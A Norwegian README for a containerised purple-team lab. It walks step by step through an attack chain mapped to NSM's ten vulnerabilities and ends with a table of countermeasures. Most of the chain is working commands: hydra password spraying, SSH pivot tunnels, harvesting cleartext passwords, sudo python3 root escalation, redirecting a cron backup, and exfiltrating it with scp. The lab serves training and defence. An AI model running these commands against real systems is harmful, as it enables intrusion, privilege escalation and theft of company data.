# Purple Lab 9
## Angrepskjede basert på NSMs ti sårbarheter i norske IKT-systemer

---

## Innhold

- [Oversikt](#oversikt)
- [Nettverkstopologi](#nettverkstopologi)
- [Containere](#containere)
- [Oppsett](#oppsett)
- [Angrepskjeden steg for steg](#angrepskjeden-steg-for-steg)
- [NSM-sårbarheter](#nsm-sårbarheter)

---

## Oversikt

Labben simulerer en liten norsk bedrift med en nettside, filserver, adminpc og backupserver.
Angrepskjeden demonstrerer alle ti sårbarhetene fra NSMs rapport
*"Erfaringer fra NSMs inntrengingstester: Ti sårbarheter i norske IKT-systemer"* (2023).

**Mål for angriperen:** Eksfiltrere sensitive bedriftsfiler fra filserveren til attacker-maskinen.

**Utgangspunkt:** Attacker er kun på frontend-nettet og kan kun nå reverse-proxy direkte.
Alt annet skjer via SSH-tunneler gjennom pivotmaskiner.

---

## Nettverkstopologi

```
INTERNETT / ATTACKER (172.20.0.50)
         │
         │  port 80 (HTTP) og port 22 (SSH – eksponert ved uhell)
         ▼
┌─────────────────────────────┐
│  reverse-proxy  172.20.0.10 │  frontend-nett (172.20.0.0/24)
│  172.21.0.10                │  backend-nett  (172.21.0.0/24)
└──────────────┬──────────────┘
               │ backend-nett
       ┌───────┴────────────────────┐
       │                            │
┌──────▼──────┐             ┌───────▼──────┐
│   webapp    │             │      db      │
│ 172.21.0.20 │             │ 172.21.0.30  │
└─────────────┘             └──────────────┘
       │
┌──────▼──────────────────────────┐
│          adminpc                │
│  172.21.0.40  (backend-nett)    │
│  172.22.0.20  (internt nett)    │
│  172.23.0.20  (backup-nett)     │
└──────┬──────────────────────────┘
       │ internt nett (172.22.0.0/24)        backup-nett (172.23.0.0/24)
  ┌────┴────────┐                          ┌─────────────────┐
  │  filserver  │                          │  backupserver   │
  │ 172.22.0.10 │                          │  172.23.0.67    │
  └─────────────┘                          └─────────────────┘
  │  brukerpc   │
  │ 172.22.0.30 │
  └─────────────┘
```

---

## Containere

| Container | IP-adresser | Rolle | Nøkkelsårbarheter |
|-----------|-------------|-------|-------------------|
| attacker | 172.20.0.50 | Kali Linux – angriper | – |
| reverse-proxy | 172.20.0.10, 172.21.0.10 | nginx + SSH | Svakt passord, SSH eksponert, nettverksbro |
| webapp | 172.21.0.20 | Flask-nettside | – |
| db | 172.21.0.30 | PostgreSQL | – |
| adminpc | 172.21.0.40, 172.22.0.20, 172.23.0.20 | Admin-maskin | Svakt passord, sudo-feil, passord i klartekst |
| filserver | 172.22.0.10 | Samba | CVE-2017-7494, SMBv1, standardpassord |
| brukerpc | 172.22.0.30 | Brukernes PC | – |
| backupserver | 172.23.0.67 | Backup via SCP | SCP-only, ingen interaktiv shell |

---

## Oppsett

```bash
# Klon/pakk ut labben
cd purple-lab9-patched_v3

# Start alle containere
docker compose up -d --build

# Verifiser at alle kjører
docker compose ps

# Koble til attacker-containeren
docker exec -it purple-lab9-attacker-1 bash
```

> **Merk:** Alle verktøy (nmap, hydra, smbclient, sshpass, nc) og ordlister
> (`/opt/wordlists/users.txt`, `/opt/wordlists/passwords.txt`) er
> forhåndslastet i attacker-containeren ved oppstart.

---

## Angrepskjeden steg for steg

> Alle kommandoer kjøres fra **attacker-containeren** med mindre annet er angitt.

---

### FASE 1 – Rekognosering

*NSM-sårbarhet: #9 – Mangelfull nettverkssegmentering*

Scan den eneste synlige maskinen fra attacker-nettet:

```bash
nmap -sT -p 22,80 172.20.0.10
```

```bash
timeout 3 nc 172.20.0.10 22
```

**Funn:** Port 22 (SSH) er åpen på reverse-proxy – en maskin som kun skal håndtere HTTP.
SSH-banneret avslører `OpenSSH 8.9p1 Ubuntu`.

---

### FASE 2 – Password spray mot SSH på reverse-proxy

*NSM-sårbarhet: #1 – Svake passord / #2 – Passordgjettingsangrep*

```bash
RESULT=$(hydra -q \
  -L /opt/wordlists/users.txt \
  -P /opt/wordlists/passwords.txt \
  ssh://172.20.0.10 -s 22 -t 4 -f 2>/dev/null \
  | grep '\[22\]\[ssh\]')

echo "$RESULT"

PROXY_SSH_USER=$(echo "$RESULT" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
PROXY_SSH_PASS=$(echo "$RESULT" | sed -n 's/.*password: \([^ ]*\).*/\1/p')

echo "Brukernavn: $PROXY_SSH_USER"
echo "Passord:    $PROXY_SSH_PASS"
```

**Funn:** `webadmin:Sommer2024` – ingen rate-limiting eller kontolåsing stopper angrepet.

---

### FASE 3 – Fotfeste på proxy og tunnel til backend

*NSM-sårbarhet: #9 – Mangelfull nettverkssegmentering*

Bekreft SSH-tilgang:

```bash
sshpass -p "$PROXY_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=5 \
  "$PROXY_SSH_USER@172.20.0.10" \
  "echo SSH_OK" 2>/dev/null \
  && echo "[+] SSH OK" || { echo "[-] Feilet"; exit 1; }
```

Kartlegg nettverkene proxy har tilgang til:

```bash
sshpass -p "$PROXY_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "$PROXY_SSH_USER@172.20.0.10" \
  "ip -o -4 addr show | awk '{print \$2, \$4}' | grep -E '172\.20\.|172\.21\.'"
```

Scan backend-nettet fra proxy:

```bash
sshpass -p "$PROXY_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "$PROXY_SSH_USER@172.20.0.10" \
  'for ip in 172.21.0.20 172.21.0.30 172.21.0.40; do
     for port in 22 5000 5432; do
       timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "$ip:$port open"
     done
   done'
```

**Funn:** `172.21.0.40:22` – adminpc har SSH. Sett opp tunnel:

```bash
pkill -f "L 2223:172.21.0.40:22" 2>/dev/null || true

sshpass -p "$PROXY_SSH_PASS" ssh -N -f \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o ExitOnForwardFailure=yes \
  -L "2223:172.21.0.40:22" \
  "$PROXY_SSH_USER@172.20.0.10"

timeout 3 bash -c "echo | nc 127.0.0.1 2223" | grep -q SSH \
  && echo "[+] Tunnel oppe: 127.0.0.1:2223 -> 172.21.0.40:22" \
  || { echo "[-] Tunnel feilet"; exit 1; }
```

---

### FASE 4 – Password spray mot adminpc via tunnel

*NSM-sårbarhet: #1 – Svake passord / #2 – Passordgjettingsangrep*

```bash
ADMINPC_RESULT=$(hydra -q \
  -L /opt/wordlists/users.txt \
  -P /opt/wordlists/passwords.txt \
  ssh://127.0.0.1 -s 2223 -t 4 -f 2>/dev/null \
  | grep '\[2223\]\[ssh\]')

echo "$ADMINPC_RESULT"

ADMINPC_SSH_USER=$(echo "$ADMINPC_RESULT" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
ADMINPC_SSH_PASS=$(echo "$ADMINPC_RESULT" | sed -n 's/.*password: \([^ ]*\).*/\1/p')

echo "Bruker:  $ADMINPC_SSH_USER"
echo "Passord: $ADMINPC_SSH_PASS"
```

**Funn:** `drift:DriftPass123`

---

### FASE 5 – Rekognosering på adminpc

*NSM-sårbarhet: #5 – Gammel konto / #9 – Mangelfull segmentering*

Sjekk hvem vi er og hvilke nett adminpc har tilgang til:

```bash
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "whoami && id && hostname"
```

```bash
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "ip -o -4 addr show | awk '{print \$2, \$4}' | grep -E '172\.21\.|172\.22\.|172\.23\.'"
```

**Funn:** drift er i sudo-gruppen. Adminpc har tilgang til både backend-nett, internt nett og backup-nett.

---

### FASE 6 – Finn passord i klartekst og eskaler til root

*NSM-sårbarhet: #4 – Ubeskyttede passord / #6 – For høye rettigheter*

Les backup-konfigurasjon med passord i klartekst:

```bash
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "cat /etc/backup.conf"
```

**Funn:** `BACKUP_USER=backupuser`, `BACKUP_PASS=Backup123`, `BACKUP_HOST=172.23.0.67`

Sjekk bash-historikk:

```bash
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "cat /home/drift/.bash_history"
```

**Funn:** `smbclient //172.22.0.10/Sensitive -U admin%AdminPass123` – Samba admin-passord i historikk.

Privilege escalation via sudo python3 (GTFOBins):

```bash
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "echo '$ADMINPC_SSH_PASS' | sudo -S python3 -c 'import os; os.system(\"id\")'"
```

**Funn:** `uid=0(root)` – full root-tilgang via NOPASSWD på python3.

---

### FASE 7 – Endre backup.conf til å sende til proxy

*NSM-sårbarhet: #4 – Ubeskyttede passord / #6 – For høye rettigheter*

Som root via sudo python3, endre backup-destinasjon fra backupserver til proxy:

```bash
sshpass -p "$ADMINPC_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -p 2223 "$ADMINPC_SSH_USER@127.0.0.1" \
  "echo '$ADMINPC_SSH_PASS' | sudo -S python3 -c \"
import os
conf = open('/etc/backup.conf').read()
conf = conf.replace('BACKUP_HOST=172.23.0.67', 'BACKUP_HOST=172.21.0.10')
conf = conf.replace('BACKUP_USER=backupuser', 'BACKUP_USER=webadmin')
conf = conf.replace('BACKUP_PASS=Backup123', 'BACKUP_PASS=Sommer2024')
conf = conf.replace('BACKUP_DEST=/data', 'BACKUP_DEST=/home/webadmin')
open('/etc/backup.conf', 'w').write(conf)
print('[+] backup.conf oppdatert:')
os.system('cat /etc/backup.conf')
\""
```

**Resultat:** Neste gang cron kjører (hvert minutt) sendes backup.zip til proxy i stedet for backupserver.

---

### FASE 8 – Vent på cron og eksfiltrering via proxy

*NSM-sårbarhet: #3 – Standardpassord / #9 – Mangelfull segmentering*

Vent på cron og sjekk om backup.zip har dukket opp på proxy:

```bash
sshpass -p "$PROXY_SSH_PASS" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "$PROXY_SSH_USER@172.20.0.10" \
  "ls -la /home/webadmin/backup.zip 2>/dev/null \
   && echo '[+] Backup mottatt' \
   || echo '[-] Ikke mottatt ennå – vent og prøv igjen'"
```

Hent backup.zip ned til attacker:

```bash
sshpass -p "$PROXY_SSH_PASS" scp \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  "$PROXY_SSH_USER@172.20.0.10:/home/webadmin/backup.zip" \
  /root/loot.zip

ls -la /root/loot.zip && echo "[+] Eksfiltrering fullført"
```

Pakk ut og les de sensitive filene:

```bash
cd /root && unzip loot.zip

cat strategi-2027.pdf
cat intern-revisjon.docx
cat "l#U00f8nnsliste-2026.xlsx"
```

---

## Angrepskjeden – visuell oversikt

```
[attacker: 172.20.0.50]
        │
        ├─[F1]─ nmap -sT → SSH port 22 åpen på reverse-proxy
        │         NSM #9: SSH eksponert på nettverksbro-maskin
        │
        ├─[F2]─ hydra → webadmin:Sommer2024
        │         NSM #1: svakt sesong+årstall-passord
        │         NSM #2: ingen rate-limiting eller kontolåsing
        │
        ├─[F3]─ SSH til proxy → ser backend-nett
        │        → tunnel 127.0.0.1:2223 → adminpc:22
        │         NSM #9: proxy er ubeskyttet nettverksbro
        │
        ├─[F4]─ hydra via tunnel → drift:DriftPass123
        │         NSM #1: svakt passord
        │         NSM #2: ingen SSH-beskyttelse på adminpc
        │
        ├─[F5]─ SSH til adminpc → i sudo-gruppen
        │        → ser internt nett og backup-nett
        │         NSM #9: adminpc er bro til alle interne nett
        │
        ├─[F6]─ cat /etc/backup.conf → passord i klartekst
        │        cat .bash_history → AdminPass123 til filserver
        │        sudo python3 → uid=0(root)
        │         NSM #4: passord i klartekst i konfig og historikk
        │         NSM #6: NOPASSWD python3 gir full root
        │
        ├─[F7]─ Endre backup.conf → peker til proxy
        │         NSM #4: konfigurasjon med klartekst-passord kan manipuleres
        │         NSM #6: root-tilgang nødvendig – oppnådd via python3
        │
        └─[F8]─ Cron sender backup.zip til proxy → attacker henter ned
                  NSM #3: webadmin:Sommer2024 (svakt standardpassord)
                  NSM #9: ingen segmentering stoppet eksfiltrering
                  Eksfiltrert: lønnsliste, intern revisjon, kontrakter, strategi
```

---

## NSM-sårbarheter

| # | Sårbarhet | Fase | Konkret funn i labben |
|---|-----------|------|-----------------------|
| 1 | Svake passord | F2, F4 | `Sommer2024`, `DriftPass123` – sesong+årstall og enkle mønstre |
| 2 | Passordgjettingsangrep | F2, F4 | Hydra kjører uforstyrret – ingen rate-limiting eller lockout |
| 3 | Uendrede standardpassord | F8 | `webadmin:Sommer2024` brukes til eksfiltrering |
| 4 | Ubeskyttede passord og autentiseringsdata | F6, F7 | Klartekst i `/etc/backup.conf` og `.bash_history` |
| 5 | Gamle, inaktive administratorkontoer | – | `itsupport:Bedriften1!` eksisterer på adminpc (ikke brukt i kjeden) |
| 6 | For høye rettigheter og feilkonfigurasjon | F6, F7 | `sudo python3 NOPASSWD` → root uten passord |
| 7 | Sårbar og utdatert programvare | – | CVE-2017-7494 (username map script) på filserver |
| 8 | Ikke-støttede versjoner | – | SMBv1/NT1 aktivert på filserver |
| 9 | Mangelfull nettverkssegmentering | F1, F3, F5, F8 | Proxy og adminpc er ubeskyttede broer mellom alle nett |
| 10 | Mangelfull herding | – | SMB uten signering, debug-konfig aktiv |

> **Merk:** Sårbarhet #5, #7, #8 og #10 er til stede i labben men inngår ikke i
> den automatiserte angrepskjeden. De kan demonstreres separat – se filserver-konfigurasjonen
> i `samba/smb.conf` og `samba/entrypoint.sh`.

---

## Tiltak

| Sårbarhet | Anbefalt tiltak |
|-----------|----------------|
| #1 Svake passord | Krev lange passfraser, bloker vanlige mønstre |
| #2 Passordgjetting | Rate-limiting på SSH, MFA, fail2ban |
| #3 Standardpassord | Tving passordbytte ved første innlogging |
| #4 Klartekst-passord | Bruk en secrets manager (f.eks. HashiCorp Vault) |
| #5 Gamle kontoer | Jevnlig revisjon – deaktiver ubrukte kontoer |
| #6 For høye rettigheter | Prinsippet om minste privilegium, aldri NOPASSWD på tolker |
| #7 Sårbar programvare | Oppdater jevnlig, fjern unødvendige features (username map script) |
| #8 Gamle protokoller | Deaktiver SMBv1, krev SMB-signering |
| #9 Segmentering | Brannmur mellom alle nett, zero trust |
| #10 Herding | Følg CIS Benchmarks, fjern debug-konfigurasjon |
